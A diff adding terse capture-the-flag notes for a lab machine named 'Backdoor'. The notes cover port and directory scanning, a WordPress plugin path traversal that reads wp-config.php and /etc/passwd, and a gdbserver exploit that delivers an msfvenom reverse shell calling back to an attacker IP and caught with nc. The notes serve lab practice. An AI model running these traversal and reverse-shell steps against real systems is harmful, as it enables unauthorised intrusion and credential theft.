@@ -1,0 +1,64 @@
+Backdoor Machine
+
+IP: 10.10.11.125
+
+nmap -Pn -p- -sC -sV -A --min-rate=400 --min-parallelism=512 10.10.11.125
+
+gobuster dir --url http://10.10.11.125 -w /usr/share/wordlists/directory-list-2.3-medium.txt
+
+gobuster dir --url http://10.10.11.125/wp-includes -w /usr/share/wordlists/directory-list-2.3-medium.txt
+
+gobuster dir --url http://10.10.11.125/wp-content/ -w /usr/share/wordlists/directory-list-2.3-medium.txt
+
+gobuster dir --url http://10.10.11.125/wp-content/plugins -w /usr/share/wordlists/directory-list-2.3-medium.txt
+
+searchsploit ebook wordpress
+
+cat /usr/share/exploitdb/exploits/php/webapps/39575.txt
+
+In browser
+10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
+
+10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/etc/passwd
+
+10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/sched_debug
+
+/proc/sched_debug
+
+In /proc/sched_debug you can see for each cpu:
+
+the number of running processes (cfs_rq[0].nr_running)
+the runnable processes (runnable tasks)
+
+10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/{pid}/cmdline
+
+gdb server exploit
+https://www.exploit-db.com/exploits/50539
+
+copy the code, paste the code into a python file and run the program
+
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.218 LPORT=4242 -f elf -o pwn.elf
+chmod 777 pwn.elf
+
+
+
+In another terminal 
+
+nc -lvnp 4242
+
+In another terminal
+https://book.hacktricks.xyz/pentesting/pentesting-remote-gdbserver
+run these commands:
+
+gdb
+target extednded-remote 10.10.11.125:1337
+remote put pwn.efl pwned.elf
+set remote exec -file pwned.elf
+run
+
+
+In nc terminal we can see that we are able to run the linux commands
+
+python3 -c 'import pty; pty.spawn("/bin/bash")' ----> to stabilise the environment
+
+cat user.txt
